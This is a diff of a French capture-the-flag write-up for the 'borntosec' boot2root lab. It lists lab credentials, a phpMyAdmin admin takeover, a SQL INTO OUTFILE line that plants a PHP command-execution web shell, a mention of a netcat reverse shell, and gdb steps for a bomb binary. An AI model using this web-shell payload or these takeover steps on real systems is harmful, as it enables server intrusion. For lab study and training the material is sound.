@@ -1,4 +1,4 @@
-# WriteUp1
+# Write Up 1
 
 ## Password
 | Service    | User                 | Passwd                                                             |
@@ -18,8 +18,8 @@
 <pre>
 {'test', 'support', 'naos', 'lmezard', 'guest', 'nagios', 'ubnt', 'root', <strong>'!q\\]Ej?*5K5cy*AJ'</strong>, 'ftpuser', 'PlcmSpIp', 'adm', 'user', 'adam', 'nvdb', 'admin', 'pi'}
 </pre>
-- Je me connecte avec les login `laurie` et `!q\]Ej?*5K5cy*AJ`
-- le mail est disponible dans les parametres de l'user
+- Je me connecte avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ`
+- Le mail est disponible dans les parametres de l'user
 
 ## Mail
 - Je me connecte au server imap avec `laurie@borntosec.net` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://borntosec.net/webmail/)
@@ -36,13 +36,13 @@ Best regards.
 - On peut donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
 - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
 - J'essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
-- en exutant cett commande sql je peux ecrire dans un fichier
+- En exutant cett commande sql je peux ecrire dans un fichier
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
-- en testant tout les dossiers du forum un est executable `/var/www/forum/templates_c`
+- En regardant le forum type de sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
 - Je creer donc un fichier avec un reverse shell pour que se soit plus facile et je creer un serveur en local avec netcat
-- dans les home un dossier est presant LOOKATME qui contient un dossier password
+- Dans les home un dossier est presant LOOKATME qui contient un dossier password
 ```
 lmezard:G!@M6f4Eatau{sF"
 ```
@@ -98,7 +98,7 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 
 - Un fichier bomb est aussi present.
 
-Nous le decompilons avec binary ninja.
+- Nous le decompilons avec binary ninja.
 
 ### Phase 1:
 - Nous pouvons reporté la string depuis binary ninja: `Public speaking is very easy.`
@@ -108,7 +108,7 @@ Nous le decompilons avec binary ninja.
 - Pour les suivant on utilise gdb
 - On break a la comparaison et on print $eax se qui nous donne le nouveau chiffre
 <pre>
-[alarmv@alarm scripts]$ gdb ./bomb 
+$> gdb ./bomb 
 gdb-peda$ b *0x8048b7e
 Breakpoint 1 at 0x8048b7e
 gdb-peda$ r
@@ -202,7 +202,7 @@ opekmq
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
-## turtle
+## Turtle
 - Il y a un fichier avec des instructions
 - En l'interpretant avec un script javascript, on voit que ca ecrit SLASH
 - En le convertissant en md5 cela donne:
